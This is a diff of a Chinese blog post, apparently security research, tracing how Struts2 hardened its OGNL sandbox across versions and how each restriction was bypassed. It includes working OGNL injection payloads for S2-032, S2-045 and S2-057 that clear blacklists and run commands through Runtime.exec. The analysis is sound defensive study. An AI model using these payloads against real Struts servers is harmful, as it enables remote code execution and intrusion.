@@ -89,7 +89,7 @@
     </div>
     
         <div id="toc" class="toc-article">
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OGNL表达式"><span class="toc-text">OGNL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL基本操作"><span class="toc-text">OGNL基本操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OGNL历史"><span class="toc-text">OGNL历史</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OGNL表达式"><span class="toc-text">OGNL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL三要素"><span class="toc-text">OGNL三要素</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL基本操作"><span class="toc-text">OGNL基本操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OGNL历史"><span class="toc-text">OGNL历史</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts-2-3-14-1版本前"><span class="toc-text">Struts 2.3.14.1版本前</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts-2-3-20版本前"><span class="toc-text">Struts 2.3.20版本前</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts-2-3-29版本前"><span class="toc-text">Struts 2.3.29版本前</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts-2-3-30-2-5-2"><span class="toc-text">Struts 2.3.30+/2.5.2+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts-2-5-16"><span class="toc-text">Struts 2.5.16</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#现阶段的OGNL"><span class="toc-text">现阶段的OGNL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-17的改变（限制命名空间）"><span class="toc-text">2.5.17的改变（限制命名空间）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-19的改进"><span class="toc-text">2.5.19的改进</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#master分支的改变"><span class="toc-text">master分支的改变</span></a></li></ol></li></ol>
 </div>
     
 </div>
@@ -143,8 +143,7 @@
     <div class="post-content ">
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前基础篇对struts2的框架做了介绍，本篇章将对struts2的原理做个简介。目前struts2已经被阿里巴巴等大厂弃用了，但是作为曾经风靡一时的框架，并且互联网上还有大量的struts2应用，是很有必要学习一番的。</p>
 <h1 id="OGNL表达式"><a href="#OGNL表达式" class="headerlink" title="OGNL表达式"></a>OGNL表达式</h1><p>OGNL（Object Graph Navigation Language）即对象图形导航语言，是一个开源的表达式引擎。使用OGNL，你可以通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化。如果我们把表达式看做是一个带有语义的字符串，那么OGNL无疑成为了这个语义字符串与Java对象之间沟通的桥梁。我们可以轻松解决在数据流转过程中所遇到的各种问题。</p>
-<p>##OGNL三要素</p>
-<p><strong>Expression(表达式)：</strong></p>
+<h2 id="OGNL三要素"><a href="#OGNL三要素" class="headerlink" title="OGNL三要素"></a>OGNL三要素</h2><p><strong>Expression(表达式)：</strong></p>
 <p>Expression规定OGNL<strong>要做什么</strong>，其本质是一个带有语法含义的字符串,这个字符串将规定操作的类型和操作的内容。OGNL支持的语法非常强大，从对象属性、方法的访问到简单计算，甚至支持复杂的lambda表达式。</p>
 <p><strong>Root(根对象)：</strong></p>
 <p>OGNL的root对象可以理解为OGNL要操作的对象，表达式规定OGNL要干什么，root则指定对<strong>谁进行操作</strong>。OGNL的root对象实际上是一个java对象，是所有OGNL操作的实际载体。</p>
@@ -192,20 +191,17 @@
 </ol>
 <h1 id="OGNL历史"><a href="#OGNL历史" class="headerlink" title="OGNL历史"></a>OGNL历史</h1><p>OgnlContext中的_memberAccess与securityMemberAccess是同一个SecurityMemberAccess类的实例，而且内容相同，也就是说全局的OgnlUtil实例都共享着相同的设置。如果利用OgnlUtil更改了设置项（excludedClasses、excludedPackageNames、excludedPackageNamePatterns）则同样会更改_memberAccess中的值。</p>
 <p>以下图例左边都是较为新的版本，右边为老版本。</p>
-<p>##Struts 2.3.14.1版本前</p>
-<p>S2-012、S2-013、S3-014的出现促使了这次更新，可以说在跟新到2.3.14.1版本前，ognl的利用基本属于不设防状态，我们可以看一下这两个版本的diff，不难发现当时还没有出现黑名单这样的说法，而修复的关键在于SecurityMemberAccess：</p>
+<h2 id="Struts-2-3-14-1版本前"><a href="#Struts-2-3-14-1版本前" class="headerlink" title="Struts 2.3.14.1版本前"></a>Struts 2.3.14.1版本前</h2><p>S2-012、S2-013、S3-014的出现促使了这次更新，可以说在跟新到2.3.14.1版本前，ognl的利用基本属于不设防状态，我们可以看一下这两个版本的diff，不难发现当时还没有出现黑名单这样的说法，而修复的关键在于SecurityMemberAccess：</p>
 <p><img src="/images/a5/3.png" alt=""></p>
 <p>左边是2.3.14.1的版本，右边是2.3.14的版本，不难看出在这之前可以通过ognl直接更改allowStaticMethodAccess=true，就可以执行后面的静态方法了，所以当时非常通用的一种poc是：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(#_memberAccess[‘allowStaticMethodAccess’]=true).(@java.lang.Runtime@getRuntime().exec(‘calc’))</span></pre></td></tr></table></figure>
 
 <p>而在2.3.14.1版本后将allowStaticMethodAccess设置成<strong>final属性</strong>后，就不能显式更改了，这样的poc显然也失效了。</p>
-<p>##Struts 2.3.20版本前</p>
-<p>在2.3.14.1后虽然不能更改allowStaticMethodAccess了，但是还是可以通过_memberAccess使用类的构造函数，并且访问公共函数，所以可以看到当时有一种替代的poc：</p>
+<h2 id="Struts-2-3-20版本前"><a href="#Struts-2-3-20版本前" class="headerlink" title="Struts 2.3.20版本前"></a>Struts 2.3.20版本前</h2><p>在2.3.14.1后虽然不能更改allowStaticMethodAccess了，但是还是可以通过_memberAccess使用类的构造函数，并且访问公共函数，所以可以看到当时有一种替代的poc：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(#p=new java.lang.ProcessBuilder(‘xcalc’)).(#p.start())</span></pre></td></tr></table></figure>
 
 <p>直到2.3.20，这样的poc都可以直接使用。在2.3.20后，Struts2不仅仅引入了黑名单（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），更加重要的是阻止了所有构造函数的使用，所以就不能使用ProcessBuilder这个payload了。</p>
-<p>##Struts 2.3.29版本前</p>
-<p>左为2.3.29版本，右边为2.3.28版本</p>
+<h2 id="Struts-2-3-29版本前"><a href="#Struts-2-3-29版本前" class="headerlink" title="Struts 2.3.29版本前"></a>Struts 2.3.29版本前</h2><p>左为2.3.29版本，右边为2.3.28版本</p>
 <p><img src="/images/a5/4.png" alt=""></p>
 <p>从黑名单中可以看到禁止使用了ognl.MemberAccess和ognl.DefaultMemberAccess，而这两个对象其实就是2.3.20-2.3.28版本的通用绕过方法，具体的思路就是利用_memberAccess调用静态对象DefaultMemberAccess，然后用DefaultMemberAccess覆盖_memberAccess。那么为什么说这样就可以使用静态方法了呢？ 我们先来看一下可以在S2-032、S2-033、S2-037通用的poc：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))</span></pre></td></tr></table></figure>
@@ -213,8 +209,7 @@
 <p>我们来看一下ognl.OgnlContext@DEFAULT_MEMBER_ACCESS：</p>
 <p><img src="https://p5.ssl.qhimg.com/t01ecfd1c68ebe3f988.jpg" alt=""></p>
 <p>看过上一节的都知道，在程序运行时在setOgnlUtil方法中将黑名单等数据赋给SecurityMemberAccess，而这就是创建_memberAccess的过程，在动态调试中，我们可以看到这两个对象的id甚至都是一样的，而SecurityAccess这个对象的父类本身就是ognl.DefaultMemberAccess，而其建立关系的过程就相当于继承父类并重写父类的过程，所以这里我们利用其父类DefaultMemberAccess覆盖_memberAccess中的内容，就相当于初始化了_memberAccess，这样就可以绕过其之前所设置的黑名单以及限制条件。</p>
-<p>##Struts 2.3.30+/2.5.2+</p>
-<p>到了2.3.30(2.5.2)之后的版本，我们可以使用的_memberAccess和DefaultMemberAccess都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路：</p>
+<h2 id="Struts-2-3-30-2-5-2"><a href="#Struts-2-3-30-2-5-2" class="headerlink" title="Struts 2.3.30+/2.5.2+"></a>Struts 2.3.30+/2.5.2+</h2><p>到了2.3.30(2.5.2)之后的版本，我们可以使用的_memberAccess和DefaultMemberAccess都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))</span></pre></td></tr></table></figure>
 
 <p>可以看到绕过的关键点在于：</p>
@@ -224,8 +219,7 @@
 <li>利用setMemberAccess覆盖</li>
 </ul>
 <p>而具体的流程可以参考2.2的内容。</p>
-<p>##Struts 2.5.16</p>
-<p>分析过S2-057后，你会发现ognl注入很容易复现，但是想要调用静态方法造成代码执行变得很难，我们来看一下Struts2又做了哪些改动：</p>
+<h2 id="Struts-2-5-16"><a href="#Struts-2-5-16" class="headerlink" title="Struts 2.5.16"></a>Struts 2.5.16</h2><p>分析过S2-057后，你会发现ognl注入很容易复现，但是想要调用静态方法造成代码执行变得很难，我们来看一下Struts2又做了哪些改动：</p>
 <ul>
 <li><p>2.5.13版本后禁止访问coontext.map</p>
 </li>
@@ -254,60 +248,42 @@
 <p>poc为：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(#context=#attr[‘struts.valueStack’].context).(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(”)).(#ognlUtil.setExcludedPackageNames(”))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">(#context=#attr[‘struts.valueStack’].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘curl 127.0.0.1:9001’))</span></pre></td></tr></table></figure>
 
-
-
-<p>#现阶段的OGNL</p>
-<p>Struts2在 2.5.16版本后做了很多修改，截止到写文章的时候，已经更新到2.5.20，接下来我将把这几个版本的区别全部都列出来，并且说明现在绕过Ognl沙箱面临着哪些阻碍。同上一节，左边都为较新的版本，右边为较旧的版本。</p>
-<p>##2.5.17的改变（限制命名空间）</p>
-<ol>
-<li>黑名单的变动，禁止访问com.opensymphony.xwork2.ognl.</li>
+<h1 id="现阶段的OGNL"><a href="#现阶段的OGNL" class="headerlink" title="现阶段的OGNL"></a>现阶段的OGNL</h1><p>Struts2在 2.5.16版本后做了很多修改，截止到写文章的时候，已经更新到2.5.20，接下来我将把这几个版本的区别全部都列出来，并且说明现在绕过Ognl沙箱面临着哪些阻碍。同上一节，左边都为较新的版本，右边为较旧的版本。</p>
+<h2 id="2-5-17的改变（限制命名空间）"><a href="#2-5-17的改变（限制命名空间）" class="headerlink" title="2.5.17的改变（限制命名空间）"></a>2.5.17的改变（限制命名空间）</h2><ol>
+<li>黑名单的变动，禁止访问com.opensymphony.xwork2.ognl.<img src="/images/a5/8.png" style="zoom:50%;" /></li>
 </ol>
 <ul>
-<li><img src="/images/a5/8.png" alt=""></li>
 <li>讲道理，2.5.17版本的修补真的是很暴力，直接在黑名单中加上了com.opensymphony.xwork2.ognl.也就是说我们根本没办法访问这个Struts2重写的ognl包了。</li>
 </ul>
-<ol>
-<li>切断了动态引用的方式，需要利用构造函数生成</li>
+<ol start="2">
+<li>切断了动态引用的方式，需要利用构造函数生成<br><img src="/images/a5/9.png" alt=""></li>
 </ol>
 <ul>
-<li><img src="/images/a5/9.png" alt=""></li>
 <li>不谈重写了setExcludedClasses和setExcludedPackageNamePatterns，单单黑名单的改进就极大的限制了利用。</li>
 </ul>
-<p>##2.5.19的改进</p>
-<ol>
-<li>ognl包的升级，从3.1.15升级到3.1.21</li>
+<h2 id="2-5-19的改进"><a href="#2-5-19的改进" class="headerlink" title="2.5.19的改进"></a>2.5.19的改进</h2><ol>
+<li><p>ognl包的升级，从3.1.15升级到3.1.21<br><img src="/images/a5/10.png" alt=""></p>
+</li>
+<li><p>黑名单改进<br><img src="/images/a5/11.png" alt=""></p>
+</li>
+<li><p>在OgnlUtil中setXWorkConverter、setDevMode、setEnableExpressionCache、setEnableEvalExpression、setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames、setContainer、setAllowStaticMethodAccess、setDisallowProxyMemberAccess都从public方法变成了protected方法了：</p>
+</li>
 </ol>
-<ul>
-<li><img src="/images/a5/10.png" alt=""></li>
-</ul>
-<ol>
-<li>黑名单改进</li>
-</ol>
-<ul>
-<li><img src="/images/a5/11.png" alt=""></li>
-</ul>
-<ol>
-<li>在OgnlUtil中setXWorkConverter、setDevMode、setEnableExpressionCache、setEnableEvalExpression、setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames、setContainer、setAllowStaticMethodAccess、setDisallowProxyMemberAccess都从public方法变成了protected方法了：</li>
-</ol>
-<ul>
-<li><img src="/images/a5/12.png" alt=""></li>
-<li><img src="/images/a5/13.png" alt=""></li>
-</ul>
+<img src="/images/a5/12.png" style="zoom:50%;" />
+<img src="/images/a5/13.png" style="zoom:50%;" />
+
 <p>也就是说没有办法显式调用setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames了。</p>
-<p>##master分支的改变</p>
-<ol>
+<h2 id="master分支的改变"><a href="#master分支的改变" class="headerlink" title="master分支的改变"></a>master分支的改变</h2><ol>
 <li>ognl包的升级，从3.1.21升级到3.2.10，直接删除了DefaultMemberAccess.java，同时删除了静态变量DEFAULT_MEMBER_ACCESS，并且_memberAccess变成了final：</li>
 </ol>
-<ul>
-<li><img src="/images/a5/14.png" alt=""></li>
-<li><img src="/images/a5/15.png" alt=""></li>
-</ul>
-<ol>
-<li>SecurityMemberAccess不再继承DefaultMemberAccess而直接转为MemberAccess接口的实现：</li>
+<img src="/images/a5/14.png" style="zoom:50%;" />
+<img src="/images/a5/15.png" style="zoom:50%;" />
+
+<ol start="2">
+<li>SecurityMemberAccess不再继承DefaultMemberAccess而直接转为MemberAccess接口的实现：<img src="/images/a5/16.png" style="zoom:50%;" />
+
+</li>
 </ol>
-<ul>
-<li><img src="/images/a5/16.png" alt=""></li>
-</ul>
 <p>可以看到Struts2.5.*基本上是对Ognl的执行做出了重大的改变，DefaultAccess彻底退出了历史舞台意味着利用父类覆盖_memberAccess的利用方式已经无法使用，而黑名单对于com.opensymphony.xwork2.ognl的限制导致我们基本上没有办法利用Ognl本身的API来更改黑名单，同时_memberAccess变为final属性也使得S2-057的这种利用_memberAccess暂时性的特征而进行“重放攻击”的方式测地化为泡影。</p>
 <p>参考：</p>
 <p><a href="https://blog.csdn.net/pngyul/article/details/82723719" target="_blank" rel="noopener">https://blog.csdn.net/pngyul/article/details/82723719</a></p>
